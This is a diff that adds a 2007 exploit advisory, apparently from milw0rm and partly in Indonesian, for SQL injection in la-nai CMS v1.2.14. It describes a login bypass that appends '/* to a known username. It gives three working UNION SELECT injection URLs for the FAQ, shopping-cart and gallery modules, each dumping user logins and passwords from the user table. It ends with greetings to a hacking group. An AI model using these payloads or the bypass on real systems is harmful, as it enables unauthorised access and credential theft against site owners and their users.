@@ -1,0 +1,45 @@
+#######################################################################
+###########                  newhack[dot]org                ############ 
+########################################################################
+# la-nai cms_v1.2.14 - Remote SQL Injection
+# Vendor      : http://www.redlinesoft.net/module.php?modname=content&cid=9
+# Download    : http://sourceforge.net/project/showfiles.php?group_id=191629
+# Found By    : k1tk4t - k1tk4t[4t]newhack.org     [ http://newhack.org ]
+# Location    : Indonesia
+########################################################################
+bug terdapat pada la-nai module
+tested modules
+-faq
+-gallery
+-ezshopingcart
+dan kemungkinan terdapat pada module lainnya,
+pada login site halaman depan, authentikasi login dapat di bypass
+dengan menggunakan username yang terdapat pada database la-nai tbl_ln_user
+dengan memberikan '/* contoh admin'/* <-- magic_quotes_gpc = off
+########################################################################
+exploit;
+FAQ Modules
+http://localhost/lanai-cms_v1.2.14/module.php?modname=faq&mf=faqviewgroup&mid=1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/1,2,userLogin,userPassword,5,6,7/**/FROM/**/tbl_ln_user/*
+----
+EZSHOPINGCART Modules
+http://localhost/lanai-cms_v1.2.14/module.php?modname=ezshopingcart&ac=c&cid=1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/1,2,concat(userLogin,'-',userPassword),4,5/**/FROM/**/tbl_ln_user/*
+----
+GALLERY Modules
+http://localhost/lanai-cms_v1.2.14/module.php?modname=gallery&mf=view&gid=1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/1,userLogin,userPassword,4/**/FROM/**/tbl_ln_user/*
+########################################################################
+Thanks;
+str0ke
+xoron [thank's for ur exploit]
+y3dips [y3d1ps.blogspot.com]
+-newhack[dot]org|staff-
+mR.opt1lc, fusion, fl3xu5, PusHm0v, Ghoz, bius, iind_id, slackX
+-----------------------
+all member newhack[dot]org
+-----------------------
+all member echo.or.id
+-----------------------
+iFX, matdhule, nyubi, x-ace, and to all my friend
+-----------------------
+Sedih ngga bisa ikut PANHAC, titip salam aja buat temen2 yang ikut PANHAC
+
+# milw0rm.com [2007-08-06]
